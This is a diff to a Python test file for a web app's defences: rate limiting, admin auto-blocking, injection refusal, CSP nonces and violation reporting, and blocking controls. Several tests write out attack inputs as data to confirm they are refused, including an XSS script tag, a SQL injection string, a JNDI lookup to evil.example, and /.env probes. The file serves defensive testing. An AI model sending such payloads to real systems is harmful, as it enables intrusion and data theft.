@@ -3,6 +3,7 @@ from __future__ import annotations
 import base64
 import hashlib
 import json
+import re
 
 import importlib
 
@@ -81,17 +82,157 @@ def test_health_check_is_never_limited(presence):
     assert client.get("/health").status_code == 200
 
 
-def test_signed_in_admins_are_never_blocked(presence):
+def test_signed_in_admins_get_more_room_but_are_not_exempt(presence):
     client = _client(ADMIN_ID)
-    for _ in range(10):
-        client.get("/.env")
+    # Five times an anonymous client's allowance, counted against the account.
+    for _ in range(14):
+        assert client.get("/.env").status_code == 404
     assert client.get("/me").status_code == 200
+    assert client.get("/.env").status_code == 403
+    blocked = client.get("/me", headers={"accept": "text/html"})
+    assert blocked.status_code == 403
+    assert "ask a director to lift the block" in blocked.text
+    assert config_app.SECURITY_SHIELD.active_blocks()[0]["ip"] == f"admin:{ADMIN_ID}"
+    assert f"Auto-blocked admin account {ADMIN_ID}" in config_app._activity_snapshot()[0]["user"]
+    # Anonymous visitors on the same network are not caught by the account's block.
+    assert _client().get("/health").status_code == 200
+    assert _client().get("/me").status_code == 200
+
+
+def test_admin_identity_comes_from_session_token_or_basic_auth(monkeypatch, presence):
+    monkeypatch.setattr(config_app, "_session_user_is_admin", lambda _request: True)
+    token = _client(ADMIN_ID).get("/api/auth/token").json()["token"]
+
+    def scope(headers=(), query=b""):
+        return {"type": "http", "headers": list(headers), "query_string": query, "path": "/"}
+
+    identify = config_app._shield_admin_identity
+    assert identify(scope([(b"authorization", f"Bearer {token}".encode())])) == ADMIN_ID
+    assert identify(scope(query=f"token={token}".encode())) == ADMIN_ID
+    assert identify(scope([(b"authorization", b"Bearer forged")])) is None
+    assert identify(scope()) is None
+
+    monkeypatch.setattr(config_app, "ADMIN_USER", "ops")
+    monkeypatch.setattr(config_app, "ADMIN_PASS", "s3cret")
+    good = base64.b64encode(b"ops:s3cret").decode()
+    bad = base64.b64encode(b"ops:wrong").decode()
+    assert identify(scope([(b"authorization", f"Basic {good}".encode())])) == "basic-auth"
+    assert identify(scope([(b"authorization", f"Basic {bad}".encode())])) is None
+
+
+def test_injection_in_the_url_is_refused_and_blocked(presence):
+    client = _client()
+    assert client.get("/archive?q=%3Cscript%3Ealert(1)%3C/script%3E").status_code == 404
+    assert client.get("/about?id=1%27%20OR%20%271%27=%271").status_code == 404
+    assert client.get("/about?x=${jndi:ldap://evil.example/a}").status_code == 403
+    assert "injection payloads" in config_app._activity_snapshot()[0]["user"]
 
 
 def test_security_headers_include_hsts():
     response = _client().get("/health")
     assert response.headers["strict-transport-security"] == "max-age=31536000"
     assert response.headers["cross-origin-opener-policy"] == "same-origin"
+
+
+# ------------------------------------------------------- script injection
+
+
+_INLINE_SCRIPT = re.compile(r"<script(?![^>]*\bsrc=)[^>]*>", re.IGNORECASE)
+
+
+def _policy_nonce(response) -> str:
+    policy = response.headers["content-security-policy"]
+    script_src = next(part for part in policy.split(";") if part.strip().startswith("script-src "))
+    assert "'unsafe-inline'" not in script_src
+    assert "script-src-attr 'none'" in policy
+    assert "object-src 'none'" in policy
+    return re.search(r"'nonce-([^']+)'", script_src).group(1)
+
+
+@pytest.mark.parametrize("path", ["/", "/about", "/features", "/wasp", "/zeta"])
+def test_pages_only_run_inline_scripts_carrying_the_response_nonce(path):
+    client = _client()
+    first = client.get(path)
+    second = client.get(path)
+    assert first.status_code == 200
+    nonce = _policy_nonce(first)
+    assert nonce != _policy_nonce(second)
+    scripts = _INLINE_SCRIPT.findall(first.text)
+    assert scripts
+    assert all(f'nonce="{nonce}"' in tag for tag in scripts), scripts
+
+
+def test_every_inline_script_in_the_templates_carries_the_nonce():
+    from pathlib import Path
+
+    missing = []
+    for template in sorted(Path("templates").glob("*.html")):
+        for tag in _INLINE_SCRIPT.findall(template.read_text()):
+            if 'nonce="{{ csp_nonce() }}"' not in tag:
+                missing.append(f"{template.name}: {tag}")
+    assert missing == []
+
+
+def test_maintenance_page_script_carries_the_nonce():
+    import contextvars
+
+    def render():
+        nonce = config_app.security_shield.new_csp_nonce()
+        return nonce, config_app._build_maintenance_response({}).body.decode()
+
+    nonce, body = contextvars.copy_context().run(render)
+    scripts = _INLINE_SCRIPT.findall(body)
+    assert scripts and all(f'nonce="{nonce}"' in tag for tag in scripts)
+
+
+def test_csp_violation_reports_land_in_the_incident_list(presence):
+    client = _client()
+    report = {
+        "csp-report": {
+            "document-uri": "https://testserver/archive?token=secret-token",
+            "violated-directive": "script-src-elem",
+            "effective-directive": "script-src-elem",
+            "blocked-uri": "inline",
+            "script-sample": "alert(document.cookie)",
+        }
+    }
+    headers = {"content-type": "application/csp-report"}
+    assert client.post("/csp-report", content=json.dumps(report), headers=headers).status_code == 204
+    event = config_app.SECURITY_SHIELD.recent_events()[0]
+    assert event["kind"] == "csp"
+    assert "an inline script on https://testserver/archive" in event["summary"]
+    assert "alert(document.cookie)" in event["summary"]
+    assert "secret-token" not in event["summary"]
+    # The same violation again is not logged twice.
+    client.post("/csp-report", content=json.dumps(report), headers=headers)
+    assert [e["kind"] for e in config_app.SECURITY_SHIELD.recent_events()].count("csp") == 1
+
+    reporting_api = [
+        {
+            "type": "csp-violation",
+            "body": {
+                "documentURL": "https://testserver/about",
+                "effectiveDirective": "script-src-elem",
+                "blockedURL": "https://evil.example/x.js?c=1",
+            },
+        }
+    ]
+    assert client.post("/csp-report", content=json.dumps(reporting_api)).status_code == 204
+    assert "https://evil.example/x.js on https://testserver/about" in config_app.SECURITY_SHIELD.recent_events()[0]["summary"]
+    # Blocked fonts and stylesheets are not attacks and stay out of the list.
+    style = {"csp-report": {"document-uri": "https://testserver/", "effective-directive": "style-src-elem",
+                            "blocked-uri": "https://fonts.googleapis.com/css2"}}
+    client.post("/csp-report", content=json.dumps(style), headers=headers)
+    assert "fonts.googleapis.com" not in config_app.SECURITY_SHIELD.recent_events()[0]["summary"]
+    assert client.post("/csp-report", content=b"x" * 20_000).status_code == 413
+    assert client.post("/csp-report", content=b"not json").status_code == 400
+
+
+def test_uploaded_media_is_never_served_as_a_page_or_script():
+    assert config_app._served_image_type("image/png") == "image/png"
+    assert config_app._served_image_type("IMAGE/WEBP; charset=x") == "image/webp"
+    for content_type in ("text/html", "application/javascript", "", None):
+        assert config_app._served_image_type(content_type) == "application/octet-stream"
 
 
 def test_director_can_block_and_unblock_from_security_overview(monkeypatch, presence):
@@ -121,6 +262,28 @@ def test_director_can_block_and_unblock_from_security_overview(monkeypatch, pres
 
     client.post("/director/security/block", data={"ip": "10.0.0.4"}, follow_redirects=False)
     assert "cannot be blocked" in client.get("/director/security-overview").text
+
+
+def test_director_can_switch_under_attack_mode(monkeypatch, presence):
+    monkeypatch.setattr(config_app, "save_json", lambda *_args, **_kwargs: None)
+
+    async def fake_director(_request):
+        return {"id": config_app.OWNER_USER_ID, "username": "Director"}, None
+
+    monkeypatch.setattr(config_app, "_require_director", fake_director)
+    client = _client()
+    response = client.post("/director/security/under-attack", data={"mode": "on", "duration": "1800"})
+    assert response.status_code == 200
+    assert "Under-attack mode is on for 30 minutes." in response.text
+    assert "Switch off under-attack mode" in response.text
+    assert config_app.SECURITY_SHIELD.under_attack()
+
+    page = client.post("/director/security/under-attack", data={"mode": "off"}).text
+    assert "Under-attack mode is off" in page
+    assert not config_app.SECURITY_SHIELD.under_attack()
+
+    client.post("/director/security/block", data={"ip": "203.0.113.0/24", "duration": "3600"})
+    assert "network 203.0.113.0/24" in client.get("/director/security-overview").text
 
 
 def test_block_routes_require_the_director(presence):
